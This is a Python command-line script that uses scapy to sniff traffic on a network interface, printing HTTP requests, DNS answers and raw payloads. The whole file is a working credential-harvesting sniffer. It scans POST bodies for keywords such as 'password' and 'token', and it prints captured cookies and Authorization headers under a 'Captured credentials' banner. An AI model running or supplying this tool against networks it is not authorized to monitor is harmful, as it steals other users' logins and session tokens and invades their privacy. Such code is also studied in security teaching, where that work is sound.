#!/usr/bin/env python
import argparse

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='Network interface to capture data from')
    parser.add_argument('--http', action="store_true",
                        help='Capture plain old unencrypted HTTP')
    parser.add_argument('--cookies', action="store_true",
                        help='Capture http cookies and authorization headers. '
                             'By default -http option will capture credentials only from POST data.')
    parser.add_argument('--dns', action='store_true',
                        help='Capture DNS records')
    parser.add_argument('--raw', action='store_true',
                        help='Capture raw records')
    parser.add_argument('--crlf', action='store_true',
                        help='Transform \\r\\n in captured data into system line separator')
    parser.add_argument('-p', '--port', dest='port', help='Listen to the specific port')

    options = parser.parse_args()
    if not options.interface:
        parser.error('Please, specify a network interface. See --help for more info')
    return options


class PacketSniffer:
    def __init__(self, network_interface, port=None):
        self.credentials_keywords = ['username',
                                     'user',
                                     'login',
                                     'email',
                                     'e-mail',
                                     'auth',
                                     'password',
                                     'pass',
                                     'key',
                                     '_user',
                                     '_username',
                                     '_pass',
                                     '_password',
                                     '_email',
                                     'token',
                                     '_token']
        self.network_interface = network_interface
        self.port = port
        self.tcp_sequences = []

    def sniff(self):
        print('[+] Starting packets sniff on ' + self.network_interface)
        if options.dns:
            print('\t>>> DNS sniffing enabled.')
        if options.http:
            print('\t>>> http sniffing enabled.')
        if options.cookies:
            print('\t>>> http-cookies sniffing enabled.')
        if options.raw:
            print('\t>>> RAW processing enabled.')
        if options.crlf:
            print('\t>>> CRLF transformation enabled.')
        if options.port:
            print('\t>>> port listening')
        try:
            scapy.sniff(iface=self.network_interface, store=False, prn=self.process_sniffed_packet)
        except Exception as e:
            print('[-] Cannot sniff due to: ' + str(e))

    def process_raw_packet(self, packet):
        if packet.haslayer(scapy.Raw):
            def handle_binary_data(raw_data):
                import re
                raw_data = repr(raw_data)
                replaced = re.sub('\\\\x..', '', raw_data)
                return replaced

            raw_data = str(packet[scapy.Raw].load)
            data = handle_binary_data(raw_data)
            if options.crlf:
                if '\\r\\n' in data:
                    data = data.replace('\\r\\n', '\n')
            source_ip = self.get_source_ip(packet)
            transport_protocol = self.get_transport_protocol(packet)
            print(colored(
                '[RAW' + transport_protocol + '] ' + source_ip + ' >>> ' + self.get_dest_ip(packet) + ' : ' + data,
                'cyan'))

    def process_sniffed_packet(self, packet):
        if self.is_duplicate(packet):
            return
        if self.port:
            allowed = self.process_port_filtering(packet)
            if not allowed:
                return
        if (options.http or (self.port and self.port == 80)) and packet.haslayer(http.HTTPRequest):
            self.process_http_packet(packet)
            return
        if options.dns and packet.haslayer(scapy.DNSQR):
            self.process_dns_packet(packet)
            return
        if options.raw:
            self.process_raw_packet(packet)
            return

    def process_port_filtering(self, packet):
        if packet.haslayer(scapy.TCP) or packet.haslayer(scapy.UDP):
            source_port = self.get_source_port(packet)
            dest_port = self.get_destionation_port(packet)

            if int(self.port) == int(source_port) or int(self.port) == int(dest_port):
                return True

    def is_duplicate(self, packet):
        if packet.haslayer(http.HTTPRequest) or packet.haslayer(http.HTTPResponse):
            seq = packet[scapy.TCP].seq
            if seq in self.tcp_sequences:
                return True
            else:
                self.tcp_sequences.append(seq)

    def process_http_packet(self, packet):
        source_ip = self.get_source_ip(packet)
        method = packet[http.HTTPRequest].Method
        url = self.get_url(packet)
        print(colored('[HTTP]\t' + source_ip + ' ' + method + ' ' + url, 'magenta'))
        if options.cookies:
            self.capture_cookies(packet)
        if packet.haslayer(scapy.Raw):
            post_data = self.get_post_data(packet)
            if post_data:
                print(colored('\n\t[*] Captured credentials: ' + str(post_data) + '\n\n', 'red'))

    def process_dns_packet(self, packet):
        if packet.haslayer(scapy.DNSRR) and packet[scapy.DNSRR].type == 1:  # 1 is stands for 'A' DNS record
            dest_ip = self.get_dest_ip(packet)
            domain_name = packet[scapy.DNSRR].rrname
            domain_ip_address = packet[scapy.DNSRR].rdata
            print(colored('[DNS]\t' + dest_ip + ' <<< ' + domain_name + ' (' + domain_ip_address + ')', 'yellow'))

    def capture_cookies(self, packet):
        cookie = packet[http.HTTPRequest].Cookie
        authorization = packet[http.HTTPRequest].Authorization
        if cookie:
            print(colored('[*] Captured cookie: ' + str(cookie), 'red'))
        if authorization:
            print(colored('[*] Captured authorization: ' + str(authorization), 'red'))
        if cookie or authorization:
            print('\n')

    def get_source_port(self, packet):
        if packet.haslayer(scapy.TCP):
            return packet[scapy.TCP].sport
        elif packet.haslayer(scapy.UDP):
            return packet[scapy.UDP].sport

    def get_destionation_port(self, packet):
        if packet.haslayer(scapy.TCP):
            return packet[scapy.TCP].dport
        elif packet.haslayer(scapy.UDP):
            return packet[scapy.UDP].dport

    def get_url(self, packet):
        url = 'http://' + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        return url

    def get_post_data(self, packet):
        load = packet[scapy.Raw].load
        if any(keyword in load for keyword in self.credentials_keywords):
            return load

    def get_source_ip(self, packet):
        if packet.haslayer(scapy.IP):
            return packet[scapy.IP].src
        else:
            return ""

    def get_transport_protocol(self, packet):
        if packet.haslayer(scapy.UDP):
            return ' UDP'
        elif packet.haslayer(scapy.TCP):
            return ' TCP'
        elif packet.haslayer(scapy.ICMP):
            return ' ICMP'
        else:
            return ''

    def get_dest_ip(self, packet):
        if packet.haslayer(scapy.IP):
            return packet[scapy.IP].dst
        else:
            return ""


options = get_arguments()
try:
    sniffer = PacketSniffer(options.interface)
    sniffer.sniff()
except KeyboardInterrupt:
    print('\n\n[*] Keyboard interrupt, exiting')
